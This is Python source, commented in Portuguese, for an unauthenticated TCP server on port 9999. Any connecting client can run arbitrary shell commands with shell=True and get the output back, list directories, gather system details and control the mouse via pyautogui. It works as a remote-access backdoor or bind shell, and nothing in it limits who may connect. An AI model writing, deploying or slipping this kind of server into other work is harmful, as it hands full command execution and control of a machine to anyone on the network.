import socket
import threading
import os
import subprocess
import json
import platform
import pyautogui

clients = []
current_directory = os.path.dirname(os.path.abspath(__file__))
server_directory = os.path.join(current_directory, 'servidor')

def handle_client(client_socket, client_address):
    global clients
    clients.append((client_socket, client_address))
    print(f"Cliente {client_address} conectado com sucesso!")
    try:
        while True:
            message = client_socket.recv(1024).decode('utf-8')
            if not message:
                break
            print(f"Recebido de {client_address}: {message}")
            try:
                action, command = message.split('|', 1)
            except ValueError:
                action = message.strip()
                command = ''
            
            json_message = {'action': action, 'command': command}
            
            if json_message['action'] == 'execute':
                result = subprocess.run(json_message['command'], shell=True, capture_output=True, text=True)
                client_socket.send((result.stdout + "\n").encode('utf-8'))
            elif json_message['action'] == 'list_dir':
                path = json_message['command'] if json_message['command'] else server_directory
                print(f"Nenhum diretorio especificado, printando diretorio padrão: {server_directory}" )
                try:
                    files = os.listdir(path)
                    client_socket.send((json.dumps(files) + "\n").encode('utf-8'))
                except FileNotFoundError:
                    client_socket.send((json.dumps([]) + "\n").encode('utf-8'))
            elif json_message['action'] == 'sys_info':
                print(f"Comando 'sys_info' recebido de {client_address}")
                info = {
                    'os': os.name,
                    'platform': platform.system(),
                    'platform_release': platform.release(),
                    'cwd': os.getcwd()
                }
                print(f"Tentando enviar resultados")
                try:
                    client_socket.send((json.dumps(info) + "\n").encode('utf-8'))
                    print(f"Resultados enviados com sucesso para {client_address}")
                except Exception as e:
                    print(f"Falha ao enviar resultados para {client_address}: {e}")
            elif json_message['action'] == 'mouse_control':
                perform_mouse_action(json_message['command'], json_message.get('params', {}))
    except Exception as e:
        print(f"Exceção inesperada no cliente {client_address}: {e}")
    finally:
        print(f"Conexão com o cliente {client_address} fechada.")
        clients.remove((client_socket, client_address))
        client_socket.close()

def perform_mouse_action(command, params):
    if command == 'move':
        pyautogui.moveTo(params.get('x', 0), params.get('y', 0))
    elif command == 'click':
        pyautogui.click()
    elif command == 'scroll':
        pyautogui.scroll(params.get('amount', 0))

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print("Servidor iniciado. Aguardando conexões...")
    
    running = True
    
    try:
        while running:
            try:
                client_socket, client_address = server.accept()
                client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
                client_handler.start()
            except OSError as e:
                print(f"Erro ao aceitar conexão: {e}")
    except KeyboardInterrupt:
        print("Recebido sinal de interrupção. Encerrando o servidor...")
    finally:
        server.close()
        for client_socket, _ in clients:
            client_socket.close()
        print("Servidor encerrado.")

if __name__ == "__main__":
    start_server()
